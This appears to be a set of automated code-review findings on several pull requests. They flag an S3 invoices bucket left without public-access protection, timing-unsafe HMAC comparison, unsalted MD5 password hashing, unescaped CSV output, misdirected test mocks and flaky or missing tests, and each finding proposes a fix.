findings.body: The declared return value is an HTTP status code, which suggests callers will branch on it (e.g. `if verify_endpoint(u) == 200`). But the common failure modes for a user-supplied URL — DNS failure, connection refused, TLS error, the 5s timeout firing, or a malformed URL — all raise `requests.exceptions.RequestException` (or `MissingSchema`) rather than returning a code, so a verification call against a bad endpoint propagates an exception into the caller instead of a "this endpoint is not reachable" result. Catch `requests.RequestException` and return a sentinel (or `None`) with the contract documented, or rename/redefine the function to return a boolean/result object so the failure case is part of the return shape.

findings.title: Invoices bucket disables all S3 public access block guardrails
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` for `acme-customer-invoices`. The PR description says only the assets bucket is meant to be public, so this looks like the assets block was copy-pasted.

Disabling these four settings does not by itself publish the objects, but it removes the only backstop that prevents a future bucket policy, a `public-read` ACL, or an object uploaded with a public canned ACL from exposing customer invoices to anonymous readers on the internet. Any principal that can call `PutBucketPolicy`/`PutObjectAcl` — or any application bug that sets an ACL — becomes a data-disclosure path.

Fix: either delete the `aws_s3_bucket_public_access_block.invoices` resource and rely on the account-level block, or set all four attributes to `true`. Consider also adding an explicit deny-non-TLS / deny-public bucket policy for a bucket of this sensitivity.

_Also raised by the correctness agent:_ Invoices bucket public access block disables all protections

_Also raised by the docs agent:_ Public access block for invoices bucket contradicts PR intent

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same HMAC hexdigest as `verify_stripe` one line above, but returns `expected == header`. Python's `==` on str short-circuits on the first differing byte, so comparison time leaks a prefix-match oracle that lets an attacker recover a valid signature byte by byte without knowing the secret. Change line 12 to `return hmac.compare_digest(expected, header)` to match line 7.

Secondary behavioural difference worth deciding deliberately: `compare_digest` raises `TypeError` when `header` is `None` or a non-ASCII `str`, whereas `==` silently returns `False`. If any caller relies on `verify_acmepay` tolerating a missing header, add an explicit `if not header: return False` guard before the compare rather than leaving the unsafe operator in place.

_Also raised by the security agent:_ Webhook signature compared with == instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: The diff adds a new public function verify_acmepay with no corresponding test in the diff. Nothing would catch a regression here (e.g. wrong hash algorithm, broken comparison logic, or the timing-unsafe `==` itself being 'fixed' incorrectly). Since verify_stripe presumably has tests exercising correct/incorrect signatures, verify_acmepay should have equivalent tests for valid signature, invalid signature, and (if it matters to this codebase) timing-safety expectations.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a password hash with a single unsalted MD5 round. MD5 is a fast, GPU-friendly digest with no work factor and no per-user salt, so anyone who obtains the stored value (DB dump, backup, log) can recover the plaintext at billions of guesses per second, and identical passwords across users produce identical hashes, enabling rainbow-table lookup.

The correct primitive is already in this file: use `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` as `hash_password` on line 7 does, and verify with `bcrypt.checkpw`. If the reset flow needs a one-time token rather than a password hash, generate it with `secrets.token_urlsafe` and compare with `hmac.compare_digest` instead of hashing a user-supplied secret.

I cannot see the caller of `hash_reset_password` in this diff or in any retrieved context, so I cannot name the exact HTTP entry point; the sink itself is unambiguous regardless of which handler feeds it.

findings.title: hash_reset_password returns a format bcrypt verification cannot check
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which is verified with `bcrypt.checkpw`. `hash_reset_password` returns a 32-char MD5 hex digest for what is evidently the same stored-password column. If both values land in the same field, the existing verifier will either raise/return False for every reset-set password (bcrypt.checkpw rejects a non-bcrypt salt) or the code needs a second, format-sniffing verification branch that is not present in this diff. Reset passwords should go through `hash_password` so one verification path covers all stored credentials; if a distinct one-time-token hash is really intended, it should not share the password column and should be named and stored accordingly.

findings.title: Public password hashing function lacks security context
findings.body: The function `hash_reset_password` is exported and callable, but contains no docstring or comment explaining why MD5 is used here despite `hash_password` using bcrypt. A caller reading this function in isolation might assume it is safe for password storage. Even if this is intentional (e.g., for a one-time token), the rationale should be documented.

findings.title: Patch target misses the name actually used by send_with_retry
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` as an attribute of the `notify.sender` module at import time. Patching `notify.transport.deliver` rebinds the attribute on the *transport* module only; `send_with_retry` still resolves its module-global `deliver` and calls the real function. The test therefore exercises the real transport (three live delivery attempts) and its assertion passes or fails on whatever the real `deliver` happens to return, proving nothing about the retry/give-up path.

Use the same target as the adjacent passing test on line 2: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the call count is 3 so the test actually pins down the retry behaviour it is named after.

findings.title: csv_rows joins values without calling csv_escape
findings.body: `csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never passes the value through `csv_escape`, which is defined immediately below for exactly this purpose. Any cell containing a comma or a double quote will split into extra columns or unbalance quoting, so the output is not parseable CSV for a perfectly ordinary input (e.g. `{"a": "Smith, J"}`). Wrap the stringified value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note this also fixes the fact that `csv_escape` currently assumes a `str` argument — `"," in value` raises `TypeError` on an int or `None`, so the `str(...)` should stay on the caller side.

findings.body: csv_rows, csv_escape (in reports/csv_export.py), dump_streaming, dump_pretty (in reports/json_export.py), and margins_for, usable_width (in reports/pdf_export.py) are all new public functions with real branching/formatting logic, but no tests were added for any of them. The repository already has a precedent of one test per exporter function (test_csv_header_matches_columns), so this is a gap relative to the project's own standard, not an external ideal. A regression in comma/quote escaping, chunked JSON boundaries, or margin arithmetic would go undetected.

findings.title: csv_rows bypasses csv_escape, allowing CSV field/record injection
findings.body:
`csv_rows` interpolates each value directly into a comma-joined line (`",".join(str(r.get(c, "")) ...)`) while the escaping helper intended for exactly this purpose, `csv_escape`, is defined three lines below and never called. A value such as `a,b` splits into two fields, a value containing `"` corrupts quoting, and a value containing `\n` or `\r` terminates the record early — letting whoever controls a single field value shift or forge downstream columns and rows for any consumer that parses the export.

Apply the escape at the point of rendering: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note that `csv_escape` also does not handle newlines (they need quoting too) and, if these files are opened in a spreadsheet, values beginning with `=`, `+`, `-`, or `@` are treated as formulas; prefixing those is the usual mitigation. Using the stdlib `csv` module would cover the structural cases for free.

I cannot see the caller in this diff or in the retrieved context, so I cannot confirm that row values originate from untrusted input — confidence reflects that.

findings.title: Date-equality assertion races the UTC midnight boundary
findings.body:
`issue_token()` captures a timestamp at one instant and line 11 captures another with `datetime.now(timezone.utc)`. The assertion only holds if both instants fall on the same UTC calendar day, so any run that crosses midnight UTC between the two calls fails, non-reproducibly. Make the test deterministic instead: inject/freeze the clock (e.g. pass an explicit `now` or patch the time source `issue_token` uses) and assert equality against that fixed value, or assert a bounded delta such as `abs(datetime.now(timezone.utc) - token.issued_at) < timedelta(seconds=5)` which has no calendar-boundary discontinuity.

_Also raised by the tests agent:_ Flaky test depends on real-time date comparison across midnight

findings.title: `is_expired` called without the `now=` argument the sibling test supplies
findings.body: The existing test on line 6 calls `is_expired(expires_at, now=...)` with an explicit clock, while line 12 relies on an implicit default. If `now` has no default in the signature this raises `TypeError`; if it does default to the real clock, the assertion becomes another wall-clock-dependent check (it holds only while `expires_at` is still in the future, which is a second timing dependency on top of the midnight issue). Pass an explicit `now=` here too so the test asserts on a fixed clock.

findings.title: New CouponExpired branch is untested
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at < now(), but the only test in this PR uses a coupon with expires_at=tomorrow(), which never exercises this branch. If the condition were inverted, off-by-one, or the exception type wrong, no test would fail.

findings.title: apply_coupon now requires coupon.expires_at; old callers break
findings.body: `apply_coupon` previously only read `coupon.amount`. It now dereferences `coupon.expires_at` unconditionally. Any existing caller or coupon object that omits the field raises `AttributeError`, and a coupon with `expires_at=None` raises `TypeError: '<' not supported between 'NoneType' and ...` rather than a meaningful billing error. The test in this same PR had to be edited to add `expires_at=tomorrow()`, which is direct evidence that constructing a coupon without it was previously valid. Either treat a missing/None expiry as "never expires" (`if coupon.expires_at is not None and coupon.expires_at < now():`) or guarantee the field at the Coupon construction boundary, and confirm no other call sites build coupons without it.
